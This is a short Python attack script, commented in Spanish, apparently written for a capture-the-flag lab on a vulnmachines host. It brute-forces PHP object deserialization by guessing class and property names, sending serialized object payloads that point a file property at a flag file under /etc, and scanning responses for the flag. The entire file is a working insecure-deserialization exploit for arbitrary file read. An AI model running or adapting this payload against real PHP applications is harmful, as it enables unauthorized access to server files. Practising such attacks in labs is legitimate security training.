#!/usr/bin/env python3
import requests
import urllib.parse
import re

base_url = "http://hackme11.vulnmachines.com:8056"

# Nombres MUY simples que podrían usar en un CTF
simple_names = [
    # Letras simples
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    
    # Números
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
    
    # Palabras muy cortas
    'F1', 'F2', 'F3', 'F4', 'F5',
    'Lab', 'Lab1', 'Lab2', 'Lab3', 'Lab4',
    'CTF', 'Ctf', 'ctf',
    'PWN', 'Pwn', 'pwn',
    'RCE', 'Rce', 'rce',
    'LFI', 'Lfi', 'lfi',
    'POI', 'Poi', 'poi',
    
    # Palabras obvias
    'Test', 'test', 'TEST',
    'Demo', 'demo', 'DEMO',
    'Example', 'example', 'EXAMPLE',
    'Sample', 'sample', 'SAMPLE',
    'Foo', 'foo', 'FOO',
    'Bar', 'bar', 'BAR',
    'Baz', 'baz', 'BAZ',
    
    # Relacionadas con el objetivo
    'Read', 'read', 'READ',
    'File', 'file', 'FILE',
    'Flag', 'flag', 'FLAG',
    'Get', 'get', 'GET',
    'Show', 'show', 'SHOW',
    'Load', 'load', 'LOAD',
    'Open', 'open', 'OPEN',
    'Cat', 'cat', 'CAT',
    
    # Combinaciones simples
    'RF', 'FR', 'GF', 'FG', 'SF', 'FS',
    'ReadF', 'FileR', 'GetF', 'ShowF',
    
    # Basadas en el sitio
    'VM', 'Vm', 'vm',
    'VN', 'Vn', 'vn',
    'SO', 'So', 'so',
    'TSG', 'Tsg', 'tsg',
    
    # Métodos mágicos como nombres
    'Destruct', 'destruct', 'DESTRUCT',
    'ToString', 'toString', 'TOSTRING',
    'Wakeup', 'wakeup', 'WAKEUP',
    'Sleep', 'sleep', 'SLEEP',
    'Magic', 'magic', 'MAGIC',
    
    # Más simples
    'X', 'Y', 'Z', 'ABC', 'XYZ', 'xxx', 'XXX'
]

print(f"[*] Testing {len(simple_names)} simple class names")

for cls in simple_names:
    # Probar con las propiedades más comunes
    for prop in ['file', 'filename', 'path', 'f']:
        payload = f'O:{len(cls)}:"{cls}":1:{{s:{len(prop)}:"{prop}";s:13:"/etc/f149.txt";}}'
        encoded = urllib.parse.quote(payload)
        url = f"{base_url}/params?vnm={encoded}"
        
        try:
            response = requests.get(url, timeout=1)
            
            # Buscar la flag
            if 'vulnmachines{' in response.text.lower():
                print(f"\n[!!!] FLAG FOUND!")
                print(f"[!!!] Class: {cls}")
                print(f"[!!!] Property: {prop}")
                matches = re.findall(r'vulnmachines\{[^}]+\}', response.text, re.IGNORECASE)
                if matches:
                    print(f"[!!!] FLAG: {matches[0]}")
                    exit(0)
                    
        except:
            pass

print("\n[-] No flag found with simple names")